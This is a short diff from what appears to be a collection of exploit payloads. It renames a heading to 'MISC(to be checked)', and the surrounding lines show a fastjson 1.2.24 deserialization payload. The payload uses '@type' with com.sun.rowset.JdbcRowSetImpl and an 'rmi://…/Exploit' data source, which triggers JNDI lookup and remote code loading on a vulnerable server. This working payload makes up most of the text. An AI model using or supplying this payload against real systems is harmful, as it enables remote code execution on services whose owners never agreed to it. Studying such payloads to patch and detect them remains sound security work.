@@ -159,7 +159,7 @@ poc:
 
 
 
-### MISC
+### MISC(to be checked)
 #### 1.2.24
 ```json
 {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}}
